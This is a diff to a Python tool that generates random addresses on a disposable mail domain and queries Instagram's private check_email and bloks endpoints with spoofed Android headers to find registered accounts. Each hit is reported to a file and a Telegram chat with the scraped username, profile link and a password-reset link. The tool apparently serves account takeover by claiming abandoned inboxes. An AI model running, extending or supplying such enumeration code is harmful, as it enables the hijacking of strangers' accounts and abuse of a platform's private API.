@@ -1249,30 +1249,29 @@ def _m2_generate_ua():
             f"{brand}; {model}; {device}; {board}; en_US; {rnd})")
 
 
-def _m2_check_v1(email):
-    """Fast path: check_email endpoint — returns 'registered', 'not_registered', or 'unknown'."""
+def _m2_check_v1(email, client):
+    """Fast path: check_email endpoint — returns 'registered', 'not_registered', or 'check_v2'."""
     try:
-        with httpx.Client(http2=True, timeout=8) as client:
-            resp = client.post(
-                "https://i.instagram.com/api/v1/users/check_email/",
-                data=f"email={email}",
-                headers={
-                    'User-Agent': _m2_generate_ua(),
-                    'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
-                    'x-ig-app-id': "567067343352427",
-                    'accept-language': "en-IN, en-US",
-                }
-            )
-            if 'email_is_taken' in resp.text:
-                return 'registered'
-            if 'available' in resp.text.lower() or '"valid"' in resp.text:
-                return 'not_registered'
-            return 'unknown'
+        resp = client.post(
+            "https://i.instagram.com/api/v1/users/check_email/",
+            data=f"email={email}",
+            headers={
+                'User-Agent': _m2_generate_ua(),
+                'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
+                'x-ig-app-id': "567067343352427",
+                'accept-language': "en-IN, en-US",
+            }
+        )
+        if 'email_is_taken' in resp.text:
+            return 'registered'
+        if 'available' in resp.text.lower() or '"valid"' in resp.text:
+            return 'not_registered'
+        return 'check_v2'
     except Exception:
-        return 'unknown'
+        return 'check_v2'
 
 
-def _m2_check_v2(email):
+def _m2_check_v2(email, client):
     """Fallback: bloks CAA search — email appears in response only when found."""
     android = "android-" + secrets.token_hex(8)
     device  = str(uuid.uuid4())
@@ -1313,28 +1312,19 @@ def _m2_check_v2(email):
         'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
     }
     try:
-        with httpx.Client(http2=True, timeout=10) as client:
-            resp = client.post(url, data=payload, headers=headers)
-            if email in resp.text:
-                return 'registered'
-            return 'not_registered'
+        resp = client.post(url, data=payload, headers=headers)
+        if email in resp.text:
+            username = None
+            m = re.search(r'"username"\s*:\s*"([A-Za-z0-9_.]{1,30})"', resp.text)
+            if m:
+                username = m.group(1)
+            return ('registered', username)
+        return ('not_registered', None)
     except Exception:
-        return 'unknown'
+        return ('unknown', None)
 
 
-def _m2_check_instagram_email(email):
-    """Check if email is registered on Instagram. Returns True on confirmed hit."""
-    result = _m2_check_v1(email)
-    if result == 'registered':
-        return True
-    if result == 'not_registered':
-        return False
-    # unknown (timeout / unexpected response) → try bloks fallback
-    result2 = _m2_check_v2(email)
-    return result2 == 'registered'
-
-
-# ── Worker: generate hi2.in email and check ───────────────────────────────────
+# ── Worker: one persistent client per thread, generate hi2.in email and check ─
 
 _M2_CHARS = 'abcdefghijklmnopqrstuvwxyz'
 
@@ -1343,51 +1333,100 @@ def _m2_gen_prefix():
 
 
 def _m2_worker(token, chat_id, stop_event):
-    global _m2_hits, _m2_good_insta, _m2_bad_insta, _m2_scanned, _m2_total, _m2_found_emails
+    global _m2_hits, _m2_good_insta, _m2_bad_insta, _m2_bad_email, _m2_scanned, _m2_total, _m2_found_emails
 
-    while not (stop_event and stop_event.is_set()):
+    try:
+        client = httpx.Client(http2=True, timeout=5)
+    except Exception:
+        client = httpx.Client(timeout=5)
+
+    try:
+        while not (stop_event and stop_event.is_set()):
+            try:
+                email = _m2_gen_prefix() + '@hi2.in'
+                _m2_scanned += 1
+                _web_state['scanned'] = _m2_scanned
+
+                if stop_event and stop_event.is_set():
+                    break
+
+                result_v1 = _m2_check_v1(email, client)
+
+                if result_v1 == 'registered':
+                    # Confirm with V2
+                    v2_status, username = _m2_check_v2(email, client)
+                    if v2_status == 'registered':
+                        _m2_good_insta += 1
+                        _web_state['good'] = _m2_good_insta
+                        _m2_record_hit(token, chat_id, email, username)
+                    elif v2_status == 'not_registered':
+                        _m2_bad_insta += 1
+                        _web_state['bad_insta'] = _m2_bad_insta
+                    else:
+                        # V2 inconclusive — trust V1
+                        _m2_good_insta += 1
+                        _web_state['good'] = _m2_good_insta
+                        _m2_record_hit(token, chat_id, email, username)
+
+                elif result_v1 == 'check_v2':
+                    v2_status, username = _m2_check_v2(email, client)
+                    if v2_status == 'registered':
+                        _m2_good_insta += 1
+                        _web_state['good'] = _m2_good_insta
+                        _m2_record_hit(token, chat_id, email, username)
+                    elif v2_status == 'unknown':
+                        _m2_bad_email += 1
+                        _web_state['bad_email'] = _m2_bad_email
+                    else:
+                        _m2_bad_insta += 1
+                        _web_state['bad_insta'] = _m2_bad_insta
+                else:
+                    _m2_bad_insta += 1
+                    _web_state['bad_insta'] = _m2_bad_insta
+
+            except Exception:
+                continue
+    finally:
         try:
-            email = _m2_gen_prefix() + '@hi2.in'
-            _m2_scanned += 1
-            _web_state['scanned'] = _m2_scanned
-
-            if _m2_check_instagram_email(email):
-                with _m2_hit_lock:
-                    _m2_hits      += 1
-                    _m2_good_insta += 1
-                    _m2_total     += 1
-                    hit_num        = _m2_hits
-
-                msg = (
-                    f"\n\n=============================\n"
-                    f"GOT A HIT  #WEYN\n"
-                    f"=============================\n"
-                    f"TOTAL HITS : {hit_num}\n"
-                    f"EMAIL : {email}\n"
-                    f"=============================\n"
-                    f"BY ~ @jinbelowg @weyn_vouches"
-                )
-
-                _save_hit_to_file(msg)
-
-                hit_entry = json.dumps({"e": email})
-                with _m2_found_lock:
-                    _m2_found_emails.append(hit_entry)
-                    if len(_m2_found_emails) > 200:
-                        _m2_found_emails.pop(0)
-
-                _web_state['hits']        = _m2_hits
-                _web_state['good']        = _m2_good_insta
-                _web_state['total']       = _m2_total
-                _web_state['recent_hits'] = list(_m2_found_emails[-20:])
-
-                _send_telegram(token, chat_id, msg)
-            else:
-                _m2_bad_insta += 1
-                _web_state['bad_insta'] = _m2_bad_insta
-
+            client.close()
         except Exception:
             pass
+
+
+def _m2_record_hit(token, chat_id, email, username=None):
+    global _m2_hits, _m2_total
+    with _m2_hit_lock:
+        _m2_hits  += 1
+        _m2_total += 1
+        hit_num    = _m2_hits
+
+    profile = username or email.split('@')[0]
+    msg = (
+        f"\n\n=============================\n"
+        f"GOT A HIT  #WEYN HI2 ALT\n"
+        f"=============================\n"
+        f"TOTAL HITS : {hit_num}\n"
+        f"EMAIL      : {email}\n"
+        f"USERNAME   : @{profile}\n"
+        f"RESET      : https://www.instagram.com/accounts/password/reset/\n"
+        f"PROFILE    : https://www.instagram.com/{profile}\n"
+        f"=============================\n"
+        f"BY ~ @jinbelowg @weyn_vouches"
+    )
+
+    _save_hit_to_file(msg)
+
+    hit_entry = json.dumps({"e": email, "u": profile})
+    with _m2_found_lock:
+        _m2_found_emails.append(hit_entry)
+        if len(_m2_found_emails) > 200:
+            _m2_found_emails.pop(0)
+
+    _web_state['hits']        = _m2_hits
+    _web_state['total']       = _m2_total
+    _web_state['recent_hits'] = list(_m2_found_emails[-20:])
+
+    _send_telegram(token, chat_id, msg)
 
 
 # ── Web entry point ────────────────────────────────────────────────────────────
